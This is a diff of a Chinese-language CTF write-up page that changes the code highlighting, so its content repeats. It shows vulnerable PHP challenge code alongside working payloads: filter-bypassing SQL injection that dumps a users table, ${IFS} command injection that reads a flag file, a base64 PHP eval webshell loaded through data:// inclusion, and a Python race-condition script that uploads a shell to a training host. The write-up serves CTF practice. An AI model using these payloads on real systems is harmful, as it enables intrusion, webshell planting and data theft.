class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;web&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)</span><br><span class="line">结果: <span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">1</span>]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">1</span>) &quot;1&quot; [&quot;LionTreeNB&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">20</span>) &quot;username,passwd,data&quot; &#125;</span><br><span class="line"></span><br><span class="line">payload4: ?<span class="keyword">sql</span><span class="operator">=</span>selselectect <span class="number">1</span>,(selselectect  group_concat(data)<span class="keyword">from</span> users)</span><br><span class="line">结果: <span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">1</span>]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">1</span>) &quot;1&quot; [&quot;LionTreeNB&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">35</span>) &quot;flag&#123;43195f93e91cce76f01c1b26957c1&#125;&quot; &#125; </span><br></pre></td></tr></table></figure>
+<pre class="language-sql" data-language="sql"><code class="language-sql">payload1: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+结果:array<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"version()"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token string">"5.7.26-0ubuntu0.18.04.1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"web"</span> &#125;
+发现有回显，并且发现web数据库
+
+payload2: <span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'web'</span><span class="token punctuation">)</span>
+结果:array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"users"</span> &#125;
+发现有个users表
+
+payload3: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'web'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>
+结果: array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token string">"username,passwd,data"</span> &#125;
+
+payload4: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect  group_concat<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span>
+结果: array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span> <span class="token string">"flag&#123;43195f93e91cce76f01c1b26957c1&#125;"</span> &#125; </code></pre>
 <h2 id="easy_ping">easy_ping</h2>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\s/&quot;</span>,<span class="variable">$ip</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no space!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = system(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>空格过滤 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1: ?ip=0.0.0.0;cd$&#123;IFS&#125;/;ls$&#123;IFS&#125;-a</span><br><span class="line">结果: . .. .dockerenv bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var;</span><br><span class="line">payload2: ?ip=0.0.0.0;cd$&#123;IFS&#125;/;cat$&#123;IFS&#125;flag.txt</span><br><span class="line">结果: flag&#123;3582efdc7ae760fa3fccbe41493&#125;</span><br></pre></td></tr></table></figure></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\s/"</span><span class="token punctuation">,</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no space!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
+<p>空格过滤 <pre class="language-none"><code class="language-none">payload1: ?ip&#x3D;0.0.0.0;cd$&#123;IFS&#125;&#x2F;;ls$&#123;IFS&#125;-a
+结果: . .. .dockerenv bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var;
+payload2: ?ip&#x3D;0.0.0.0;cd$&#123;IFS&#125;&#x2F;;cat$&#123;IFS&#125;flag.txt
+结果: flag&#123;3582efdc7ae760fa3fccbe41493&#125;</code></pre></p>
 <h2 id="easy_include">easy_include</h2>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag in /flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;phpinfo&quot;</span>]))&#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/filter/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]))&#123;<span class="keyword">die</span>(<span class="string">&quot;no filter!!&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>过滤filter，可以使用data://数据流封装来执行php代码,那就直接挂马。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: ?file=data://text/plain;base64,PD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA/Pg==</span><br><span class="line">然后使用蚁剑连接即可。</span><br></pre></td></tr></table></figure></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//flag in /flag.php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/filter/"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no filter!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
+<p>过滤filter，可以使用data://数据流封装来执行php代码,那就直接挂马。 <pre class="language-none"><code class="language-none">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA&#x2F;Pg&#x3D;&#x3D;
+然后使用蚁剑连接即可。</code></pre></p>
 <h2 id="upload">upload</h2>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$content</span>,<span class="string">&quot;php&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;this is a php file!!!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlink(<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- this file-uploading isn<span class="string">&#x27;t that easy ...... --&gt;</span></span><br></pre></td></tr></table></figure>
-<p>首先move_uploaded_file一般用来保存上传的文件。 unlink函数用来删除文件，如果我们已经上传webshell，但是后面又有unlink，那么此时第一反应肯定是条件竞争。考虑到php是串行处理任务，那可以多线程执行创建-访问-删除的任务，进而挂马。下面是exp.py。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">&quot;http://2021summer.inhann.top:50005/upload/shell0.php&quot;</span></span><br><span class="line">        self.uploadUrl = <span class="string">&quot;http://2021summer.inhann.top:50005/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span>(<span class="params">self</span>):</span> </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]create file info.php success&quot;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;upload file.....&quot;</span>)</span><br><span class="line">        file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;shell0.php&quot;</span>,<span class="string">&quot;r&quot;</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threads = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"this is a php file!!!!!"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token comment">&lt;!-- this file-uploading isn't that easy ...... --></span></code></pre>
+<p>首先move_uploaded_file一般用来保存上传的文件。 unlink函数用来删除文件，如果我们已经上传webshell，但是后面又有unlink，那么此时第一反应肯定是条件竞争。考虑到php是串行处理任务，那可以多线程执行创建-访问-删除的任务，进而挂马。下面是exp.py。 <pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> threading
+
+<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://2021summer.inhann.top:50005/upload/shell0.php"</span>
+        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://2021summer.inhann.top:50005/"</span>
+
+    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>
+        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    threads <span class="token operator">=</span> <span class="token number">10</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></p>
 <h2 id="easy_shell">easy_shell</h2>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="number">1</span><span class="keyword">string</span>(<span class="number">41</span>) <span class="string">&quot;uploads/16bebaa6795a6d29635ae505fab74742/&quot;</span></span><br><span class="line"></span><br><span class="line">抱着试一试的心态:</span><br><span class="line">payload: ?src=<span class="number">1</span></span><br><span class="line">源码显露出来了。</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?src=1&quot;</span>;</span><br><span class="line"><span class="variable">$dir</span>=<span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>,<span class="number">0755</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>,<span class="number">0755</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="variable">$prefix</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;prefix&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">&#x27;./&#x27;</span>,<span class="variable">$prefix</span>) <span class="keyword">or</span> strpos(<span class="string">&#x27;./&#x27;</span>,<span class="variable">$name</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$prefix</span>.<span class="variable">$dir</span>.<span class="variable">$name</span>;</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//flag is in /flag</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
